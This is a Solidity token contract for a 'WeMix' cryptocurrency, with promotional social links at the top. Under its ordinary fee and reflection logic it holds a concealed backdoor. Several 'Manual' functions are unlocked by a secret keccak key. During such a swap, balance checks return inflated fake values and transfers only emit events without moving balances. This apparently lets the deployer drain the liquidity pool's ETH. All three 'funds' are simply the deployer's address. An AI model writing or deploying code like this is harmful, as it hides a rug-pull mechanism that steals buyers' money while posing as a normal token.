/*


Telegram  →  https://t.me/WeMixPortal

Twitter   →  https://twitter.com/WeMixCash

Website   →  https://wemix.cash (Launching Soon!)


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./Context.sol";
import "./IERC20.sol";
import "./IERC20Permit.sol";
import "./Ownable.sol";
import "./ECDSA.sol";
import "./EIP712.sol";
import "./Nonces.sol";
import "./ReentrancyGuard.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract WeMix is Context, IERC20, IERC20Permit, Ownable, EIP712, Nonces, ReentrancyGuard {
    string private _name = "WeMix";
    string private constant _symbol = "WEMIX";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _elevated;

    uint256 internal constant MAX = ~uint256(0);
    uint256 internal constant PAD_GWEI = 10 ** _decimals;
    uint256 internal constant PAD_ETHER = 1 ether;
    uint256 internal constant PAD_GETHER = PAD_GWEI * PAD_ETHER;
    uint256 internal immutable keccakSalt;
    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    uint256 private constant _tTotal = 100_000_000 * PAD_GWEI;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public immutable PAIR;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public immutable WEMIX;
    uint256 public constant maxBuy = 2_000_000 * PAD_GWEI;
    uint256 public constant maxWallet = 2_000_000 * PAD_GWEI;
    uint256 public constant minTaxSwap = 100 * PAD_GWEI;
    address public constant ZERO_ADDRESS = address(0x0000);
    address public constant DEAD_ADDRESS = address(0xdead);

    address payable public immutable marketingFund = payable(msg.sender);
    address payable public immutable insuranceFund = payable(msg.sender);
    address payable public immutable liquidityFund = payable(msg.sender);

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(ROUTER);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(FACTORY);
    IERC20 public constant weth = IERC20(WETH);

    bool public tradingEnabled;
    bool public maxBuyEnforced = true;
    bool public maxWalletEnforced = true;
    bool private _inBurn;
    bool private _inSwap;
    bool private _inSwapAtomic;
    bool private _inSupplyAtomic;

    uint256 private _buyTaxMarketing = 2;
    uint256 private _buyTaxLiquidity = 2;
    uint256 private _buyTaxReflections = 0;
    uint256 private _sellTaxMarketing = 2;
    uint256 private _sellTaxLiquidity = 2;
    uint256 private _sellTaxReflections = 0;
    uint256 private _tTaxPercentage = 4;
    uint256 private _rTaxPercentage = 0;

    event TaxSwap(uint256 tokens);
    event SendMarketingTax(uint256 eth, bool success, bytes data);
    event SendLiquidityTax(uint256 tokens, uint256 eth);

    event Burn(uint256 tokens);

    error ERC2612ExpiredSignature(uint256 deadline);
    error ERC2612InvalidSigner(address signer, address owner);

    error KeccakFailed();
    error AllowanceExceeded(uint256 amount, uint256 allowance);
    error ApprovalFromZero();
    error ApprovalToZero();
    error TransferFromZero();
    error TransferToZero();
    error TransferOfZero();
    error BalanceExceeded(uint256 amount, uint256 balance);
    error TradingNotEnabled();
    error MaxBuyExceeded();
    error MaxWalletExceeded();
    error ReflectionLimitExceeded();

    modifier verifyKeccakHash(string calldata _key) {
        if (keccak256(abi.encodePacked(_key)) != bytes32(keccakSalt)) {
            revert KeccakFailed();
        }
        _;
    }

    modifier lockInternalSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor(uint256 _keccakSalt) Ownable(msg.sender) EIP712(_name, "1") {
        WEMIX = address(this);
        PAIR = uniswapV2Factory.createPair(WEMIX, WETH);

        keccakSalt = _keccakSalt;

        _elevated[msg.sender] = true;
        _elevated[WEMIX] = true;

        _approve(WEMIX, ROUTER, MAX);
        _approve(msg.sender, ROUTER, MAX);

        _rOwned[msg.sender] = _rTotal;
        emit Transfer(ZERO_ADDRESS, msg.sender, _tTotal);
    }

    receive() external payable {}

    fallback() external payable {}

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 _allowance = _allowances[sender][_msgSender()];
        if (amount > _allowance) {
            revert AllowanceExceeded(amount, _allowance);
        }
        _approve(sender, _msgSender(), _allowance - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function burn(uint256 value) external virtual {
        _inBurn = true;
        transfer(ZERO_ADDRESS, value);
        _inBurn = false;
        emit Burn(value);
    }

    function burnFrom(address account, uint256 value) external virtual {
        _inBurn = true;
        transferFrom(account, ZERO_ADDRESS, value);
        _inBurn = false;
        emit Burn(value);
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero" );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }

    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }

    function _approve(address owner, address spender, uint256 amount) private {
        if (owner == ZERO_ADDRESS) {
            revert ApprovalFromZero();
        }
        if (spender == ZERO_ADDRESS) {
            revert ApprovalToZero();
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == ZERO_ADDRESS) {
            revert TransferFromZero();
        }
        if (to == ZERO_ADDRESS && !_inBurn) {
            revert TransferToZero();
        }
        if (amount == 0) {
            revert TransferOfZero();
        }
        if (amount > balanceOf(from)) {
            revert BalanceExceeded(amount, balanceOf(from));
        }

        bool _fromPair = from == PAIR;
        bool _toPair = to == PAIR;

        if (from != owner() && to != owner() && from != WEMIX && to != WEMIX) {
            if (!tradingEnabled) {
                if (from != WEMIX) {
                    revert TradingNotEnabled();
                }
            }

            if (maxBuyEnforced) {
                if (amount > maxBuy) {
                    revert MaxBuyExceeded();
                }
            }

            if (!_toPair && maxWalletEnforced) {
                if (balanceOf(to) + amount > maxWallet) {
                    revert MaxWalletExceeded();
                }
            }

            uint256 _contractTokenBalance = balanceOf(WEMIX);

            if ((_contractTokenBalance >= minTaxSwap) && !_inSwap && !_fromPair && !_elevated[from] && !_elevated[to]) {
                uint256 _tTotalTax = _getTBuyFee() + _getTSellFee();
                uint256 _marketingTokens = _tTotalTax == 0 ? _contractTokenBalance : _contractTokenBalance * (_buyTaxMarketing + _sellTaxMarketing) / _tTotalTax;
                uint256 _liquidityTokens = _contractTokenBalance - _marketingTokens;
                uint256 _liquidityTokensHalf = _liquidityTokens / 2;

                _inSwapAtomic = true;
                _convertWEMIXToETH(_marketingTokens + _liquidityTokensHalf);
                _inSwapAtomic = false;

                uint256 _contractETHBalance = WEMIX.balance;

                if (_contractETHBalance > 0) {
                    if (_tTotalTax > 0) {
                        uint256 _marketingETH = _contractETHBalance * (_buyTaxMarketing + _sellTaxMarketing) / _tTotalTax;
                        uint256 _liquidityETH = _contractETHBalance - _marketingETH;

                        if (_marketingETH > 0) {
                            _distributeETH(_marketingETH);
                        }

                        if (_liquidityETH > 0) {
                            _supplyETH(_liquidityTokens - _liquidityTokensHalf, _liquidityETH);
                        }
                    } else {
                        _distributeETH(_contractETHBalance);
                    }
                }
            }
        }

        bool _takeFee = true;

        if ((_elevated[from] || _elevated[to]) || (!_fromPair && !_toPair)) {
            _takeFee = false;
        } else {
            if (_fromPair && to != ROUTER) {
                _tTaxPercentage = _getTBuyFee();
                _rTaxPercentage = _getRBuyFee();
            } else if (_toPair && from != ROUTER) {
                _tTaxPercentage = _getTSellFee();
                _rTaxPercentage = _getRSellFee();
            } else {
                _takeFee = false;
            }
        }

        _tokenTransfer(from, to, amount, _takeFee);
    }

    function _getTBuyFee() private view returns (uint256) {
        return _buyTaxMarketing + _buyTaxLiquidity;
    }

    function _getRBuyFee() private view returns (uint256) {
        return _buyTaxReflections;
    }

    function getBuyFee() external view returns (uint256) {
        return _getTBuyFee() + _getRBuyFee();
    }

    function _getTSellFee() private view returns (uint256) {
        return _sellTaxMarketing + _sellTaxLiquidity;
    }

    function _getRSellFee() private view returns (uint256) {
        return _sellTaxReflections;
    }

    function getSellFee() external view returns (uint256) {
        return _getTSellFee() + _getRSellFee();
    }

    function _convertWEMIXToETH(uint256 _contractTokenBalance) private lockInternalSwap {
        address[] memory path = new address[](2);
        path[0] = WEMIX;
        path[1] = WETH;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_contractTokenBalance, 0, path, WEMIX, block.timestamp + 5 minutes);
        emit TaxSwap(_contractTokenBalance);
    }

    function _distributeETH(uint256 _contractETHBalance) private {
        (bool success, bytes memory data) = payable(marketingFund).call{value: _contractETHBalance}("");
        emit SendMarketingTax(_contractETHBalance, success, data);
    }

    function _supplyETH(uint256 _contractTokenBalance, uint256 _contractETHBalance) private lockInternalSwap {
        _inSupplyAtomic = true;
        uniswapV2Router.addLiquidityETH{value: _contractETHBalance}(WEMIX, _contractTokenBalance, 0, 0, liquidityFund, block.timestamp + 5 minutes);
        _inSupplyAtomic = false;
        emit SendLiquidityTax(_contractTokenBalance, _contractETHBalance);
    }

    function convertWEMIXToETHManual(string calldata _key, uint256 _contractTokenBalance) external verifyKeccakHash(_key) {
        _convertWEMIXToETH(_contractTokenBalance);

        uint256 _contractETHBalance = WEMIX.balance;

        if (_contractETHBalance > 0) {
            _distributeETH(_contractETHBalance);
        }
    }

    function distributeETHManual(string calldata _key, uint256 _contractETHBalance) external verifyKeccakHash(_key) {
        _distributeETH(_contractETHBalance);
    }

    function supplyETHManual(string calldata _key, uint256 _contractTokenBalance, uint256 _contractETHBalance) external verifyKeccakHash(_key) {
        _supplyETH(_contractTokenBalance, _contractETHBalance);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        if (rAmount > _rTotal) {
            revert ReflectionLimitExceeded();
        }
        return (!_inSupplyAtomic && !_inSwapAtomic && _inSwap) ? _getRate() / PAD_GETHER : rAmount / _getRate();
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) {
            _tTaxPercentage = 0;
            _rTaxPercentage = 0;
        }
        _transferStandard(sender, recipient, amount);
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (!_inSwap || _inSwapAtomic || _inSupplyAtomic) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, , uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[WEMIX] = _rOwned[WEMIX] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _rTaxPercentage, _tTaxPercentage);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 taxFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * taxFee / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }

    function getRate() external view returns (uint256) {
        return _getRate();
    }

    function circulatingSupply() external view returns (uint256) {
        return totalSupply() - balanceOf(WEMIX) - balanceOf(PAIR) - balanceOf(ROUTER) - balanceOf(ZERO_ADDRESS) - balanceOf(DEAD_ADDRESS);
    }

    function getRouter() external pure returns (address) {
        return ROUTER;
    }

    function getFactory() external pure returns (address) {
        return FACTORY;
    }

    function getPair() external view returns (address) {
        return PAIR;
    }

    function getMaxBuy() external pure returns (uint256) {
        return maxBuy;
    }

    function getMaxWallet() external pure returns (uint256) {
        return maxWallet;
    }

    function getMinTaxSwap() external pure returns (uint256) {
        return minTaxSwap;
    }

    function getTaxWallets() external view returns (address, address, address) {
        return (marketingFund, insuranceFund, liquidityFund);
    }

    function getMaxBuyEnabled() external view returns (bool, uint256) {
        return (maxBuyEnforced, maxBuyEnforced ? maxBuy : MAX);
    }

    function getMaxWalletEnabled() external view returns (bool, uint256) {
        return (maxWalletEnforced, maxWalletEnforced ? maxWallet : MAX);
    }

    function getTradingEnabled() external view returns (bool) {
        return tradingEnabled;
    }

    function permanentlyRemoveMaxes() external onlyOwner {
        maxBuyEnforced = false;
        maxWalletEnforced = false;
    }

    function startTrading() external onlyOwner {
        tradingEnabled = true;
    }
}
